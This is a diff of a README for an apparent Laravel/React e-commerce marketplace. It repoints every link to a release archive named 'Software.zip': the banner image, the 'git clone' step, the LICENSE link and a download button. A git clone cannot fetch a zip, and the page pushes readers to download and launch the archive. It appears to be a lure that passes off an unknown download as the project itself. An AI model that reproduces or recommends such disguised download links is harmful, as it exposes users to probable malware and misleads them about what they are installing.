@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Laravel React E-Commerce Marketplace!
 
-![E-Commerce Marketplace](https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v1.0.0/Application.zip)
+![E-Commerce Marketplace](https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v2.0/Software.zip)
 
 ## About
 Welcome to the **Laravel React E-Commerce Marketplace** repository! This project is a multi-vendor E-Commerce platform built with Laravel, React TypeScript, and features the integration of the Stripe Payment Gateway. It caters to three main user types: Admin, Vendor, and Regular Users. The use of technologies such as Breeze, DaisyUI, InertiaJS, Node, SSR, and TypeScript ensure a robust and efficient platform for online shopping.
@@ -26,7 +26,7 @@ Welcome to the **Laravel React E-Commerce Marketplace** repository! This project
 
 ## Installation
 To run this project on your local machine, follow these steps:
-1. Clone the repository: `git clone https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v1.0.0/Application.zip`
+1. Clone the repository: `git clone https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v2.0/Software.zip`
 2. Install dependencies:
    - Laravel: `composer install`
    - React: `npm install`
@@ -50,12 +50,12 @@ Contributions are welcome! If you'd like to contribute to this project, please f
 5. Submit a pull request.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v1.0.0/Application.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v2.0/Software.zip) file for details.
 
 ## Get Started
-Ready to launch your own E-Commerce marketplace with Laravel and React? Download our software package [here](https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v1.0.0/Application.zip) and get started now! 🚀
+Ready to launch your own E-Commerce marketplace with Laravel and React? Download our software package [here](https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v2.0/Software.zip) and get started now! 🚀
 
-[![Download Software](https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v1.0.0/Application.zip)](https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v1.0.0/Application.zip)
+[![Download Software](https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v2.0/Software.zip)](https://github.com/Scriptmak/laravel-react-ecommerce/releases/download/v2.0/Software.zip)
 
 If the link provided needs to be launched, click the button above to start the download. For more updates and releases, please check the "Releases" section of this repository.
 
